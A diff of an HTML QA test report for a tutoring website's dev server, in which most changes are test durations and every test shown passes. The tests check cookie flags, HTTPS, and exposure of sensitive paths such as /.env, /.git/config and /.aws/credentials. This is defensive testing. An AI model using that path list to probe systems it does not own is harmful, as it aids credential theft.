     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa14_session_cookies_have_secure_flag</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.19s</span>
+    <span class="trow-dur">2.86s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Cookies sent over HTTPS must have the Secure flag.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.19s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa14_session_cookies_have_secure_flag</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Cookies sent over HTTPS must have the Secure flag.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.86s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa14_session_cookies_have_secure_flag</code></span></div>
   </div>
 </details>
 
@@ -10172,10 +10172,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa14_cookies_have_samesite</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.87s</span>
+    <span class="trow-dur">2.74s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Cookies must declare a SameSite policy (None/Lax/Strict).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.87s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa14_cookies_have_samesite</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Cookies must declare a SameSite policy (None/Lax/Strict).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.74s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa14_cookies_have_samesite</code></span></div>
   </div>
 </details>
 
@@ -10184,10 +10184,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa14_no_cookie_with_excessive_lifetime</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.90s</span>
+    <span class="trow-dur">2.74s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Cookies should not persist &gt;1 year — privacy + breach exposure.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.90s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa14_no_cookie_with_excessive_lifetime</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Cookies should not persist &gt;1 year — privacy + breach exposure.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.74s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa14_no_cookie_with_excessive_lifetime</code></span></div>
   </div>
 </details>
   </div>
@@ -10208,10 +10208,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_https_enforced</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">0.93s</span>
+    <span class="trow-dur">0.98s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">The HTTP version of BASE_URL must redirect to HTTPS.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.93s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_https_enforced</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">The HTTP version of BASE_URL must redirect to HTTPS.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.98s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_https_enforced</code></span></div>
   </div>
 </details>
 
@@ -10220,10 +10220,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/.env, env file] · BASE_URL</span>
-    <span class="trow-dur">0.55s</span>
+    <span class="trow-dur">0.59s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.env, env file] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.55s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.env, env file] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.59s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10232,10 +10232,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/.git/config, git config] · BASE_URL</span>
-    <span class="trow-dur">0.53s</span>
+    <span class="trow-dur">0.58s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.git/config, git config] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.53s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.git/config, git config] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.58s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10244,10 +10244,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/admin, admin panel] · BASE_URL</span>
-    <span class="trow-dur">0.60s</span>
+    <span class="trow-dur">0.58s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/admin, admin panel] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.60s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/admin, admin panel] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.58s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10256,10 +10256,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/wp, admin, WordPress admin] · BASE_URL</span>
-    <span class="trow-dur">0.54s</span>
+    <span class="trow-dur">0.58s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/wp, admin, WordPress admin] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/wp, admin, WordPress admin] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.58s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10268,10 +10268,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/phpinfo.php, phpinfo] · BASE_URL</span>
-    <span class="trow-dur">0.70s</span>
+    <span class="trow-dur">0.54s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/phpinfo.php, phpinfo] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.70s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/phpinfo.php, phpinfo] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10280,10 +10280,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/server, status, Apache server, status] · BASE_URL</span>
-    <span class="trow-dur">0.55s</span>
+    <span class="trow-dur">0.54s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/server, status, Apache server, status] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.55s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/server, status, Apache server, status] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10292,10 +10292,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/.aws/credentials, AWS credentials] · BASE_URL</span>
-    <span class="trow-dur">0.56s</span>
+    <span class="trow-dur">0.54s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.aws/credentials, AWS credentials] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.56s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.aws/credentials, AWS credentials] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10304,10 +10304,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/config.json, config json] · BASE_URL</span>
-    <span class="trow-dur">0.58s</span>
+    <span class="trow-dur">0.54s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/config.json, config json] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.58s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/config.json, config json] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10340,10 +10340,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_no_sensitive_endpoint_exposed</span>
     <span class="trow-params">[/.DS_Store, macOS metadata] · BASE_URL</span>
-    <span class="trow-dur">0.52s</span>
+    <span class="trow-dur">0.53s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.DS_Store, macOS metadata] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.52s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Sensitive endpoints must NOT return 2xx with their content.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[/.DS_Store, macOS metadata] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.53s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_no_sensitive_endpoint_exposed</code></span></div>
   </div>
 </details>
 
@@ -10352,11 +10352,11 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_404_does_not_leak_stacktrace</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">0.53s</span>
+    <span class="trow-dur">0.54s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">A 404 page must not contain Python/Java/Node stacktraces or
-framework debug info.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.53s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_404_does_not_leak_stacktrace</code></span></div>
+framework debug info.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_404_does_not_leak_stacktrace</code></span></div>
   </div>
 </details>
 
@@ -10365,12 +10365,12 @@ framework debug info.</span></div><div class="td-row"><span class="td-lbl">Test 
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_sequential_id_probe_no_oracle</span>
     <span class="trow-params">[1] · BASE_URL</span>
-    <span class="trow-dur">0.95s</span>
+    <span class="trow-dur">0.89s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Probing common /users/{id} or /api/users/{id} paths must NOT
 return a different response shape for valid vs invalid IDs (which
-would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[1] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.95s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
+would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[1] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.89s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
   </div>
 </details>
 
@@ -10379,12 +10379,12 @@ would be a username-enumeration oracle).</span></div><div class="td-row"><span c
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_sequential_id_probe_no_oracle</span>
     <span class="trow-params">[2] · BASE_URL</span>
-    <span class="trow-dur">0.91s</span>
+    <span class="trow-dur">0.92s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Probing common /users/{id} or /api/users/{id} paths must NOT
 return a different response shape for valid vs invalid IDs (which
-would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[2] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.91s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
+would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[2] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.92s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
   </div>
 </details>
 
@@ -10393,12 +10393,12 @@ would be a username-enumeration oracle).</span></div><div class="td-row"><span c
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_sequential_id_probe_no_oracle</span>
     <span class="trow-params">[999999] · BASE_URL</span>
-    <span class="trow-dur">0.94s</span>
+    <span class="trow-dur">1.00s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Probing common /users/{id} or /api/users/{id} paths must NOT
 return a different response shape for valid vs invalid IDs (which
-would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[999999] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.94s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
+would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[999999] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.00s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
   </div>
 </details>
 
@@ -10407,12 +10407,12 @@ would be a username-enumeration oracle).</span></div><div class="td-row"><span c
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_sequential_id_probe_no_oracle</span>
     <span class="trow-params">[00000000, 0000, 0000, 0000, 000000000001] · BASE_URL</span>
-    <span class="trow-dur">0.88s</span>
+    <span class="trow-dur">0.91s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Probing common /users/{id} or /api/users/{id} paths must NOT
 return a different response shape for valid vs invalid IDs (which
-would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[00000000, 0000, 0000, 0000, 000000000001] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.88s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
+would be a username-enumeration oracle).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">[00000000, 0000, 0000, 0000, 000000000001] · BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.91s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_sequential_id_probe_no_oracle</code></span></div>
   </div>
 </details>
 
@@ -10421,11 +10421,11 @@ would be a username-enumeration oracle).</span></div><div class="td-row"><span c
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa15_options_method_does_not_leak_methods</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">0.52s</span>
+    <span class="trow-dur">0.53s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">An OPTIONS preflight must not return wildcard methods like
-TRACE, DELETE on the root that could enable cross-site tracing.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.52s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_options_method_does_not_leak_methods</code></span></div>
+TRACE, DELETE on the root that could enable cross-site tracing.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">0.53s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa15_options_method_does_not_leak_methods</code></span></div>
   </div>
 </details>
   </div>
@@ -10446,11 +10446,11 @@ TRACE, DELETE on the root that could enable cross-site tracing.</span></div><div
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa16_core_web_vitals</span>
     <span class="trow-params">homepage_en, https://dev.prowhats.com/en</span>
-    <span class="trow-dur">3.94s</span>
+    <span class="trow-dur">4.05s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Core Web Vitals must all be within budget for a passing user
-experience. Logs all values so the team sees actuals even on pass.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_en, https://dev.prowhats.com/en</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.94s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa16_core_web_vitals</code></span></div>
+experience. Logs all values so the team sees actuals even on pass.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_en, https://dev.prowhats.com/en</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.05s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa16_core_web_vitals</code></span></div>
   </div>
 </details>
 
@@ -10459,11 +10459,11 @@ experience. Logs all values so the team sees actuals even on pass.</span></div><
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa16_core_web_vitals</span>
     <span class="trow-params">find_tutors, https://dev.prowhats.com/en/find, tutors</span>
-    <span class="trow-dur">3.77s</span>
+    <span class="trow-dur">3.90s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Core Web Vitals must all be within budget for a passing user
-experience. Logs all values so the team sees actuals even on pass.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">find_tutors, https://dev.prowhats.com/en/find, tutors</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.77s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa16_core_web_vitals</code></span></div>
+experience. Logs all values so the team sees actuals even on pass.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">find_tutors, https://dev.prowhats.com/en/find, tutors</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.90s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa16_core_web_vitals</code></span></div>
   </div>
 </details>
 
@@ -10472,11 +10472,11 @@ experience. Logs all values so the team sees actuals even on pass.</span></div><
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa16_core_web_vitals</span>
     <span class="trow-params">become_tutor, https://dev.prowhats.com/en/become, tutor</span>
-    <span class="trow-dur">3.75s</span>
+    <span class="trow-dur">3.90s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Core Web Vitals must all be within budget for a passing user
-experience. Logs all values so the team sees actuals even on pass.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">become_tutor, https://dev.prowhats.com/en/become, tutor</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.75s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa16_core_web_vitals</code></span></div>
+experience. Logs all values so the team sees actuals even on pass.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">become_tutor, https://dev.prowhats.com/en/become, tutor</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.90s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa16_core_web_vitals</code></span></div>
   </div>
 </details>
   </div>
@@ -10497,10 +10497,10 @@ experience. Logs all values so the team sees actuals even on pass.</span></div><
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa18_offline_does_not_crash_page</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.88s</span>
+    <span class="trow-dur">3.96s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Going offline mid-session must not produce uncaught JS errors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.88s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_offline_does_not_crash_page</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Going offline mid-session must not produce uncaught JS errors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.96s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_offline_does_not_crash_page</code></span></div>
   </div>
 </details>
 
@@ -10509,12 +10509,12 @@ experience. Logs all values so the team sees actuals even on pass.</span></div><
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa18_blocked_api_shows_no_white_screen</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.98s</span>
+    <span class="trow-dur">3.99s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">If the main API is unreachable, the page must still render
 SOMETHING (loader, error message, fallback content) — never a
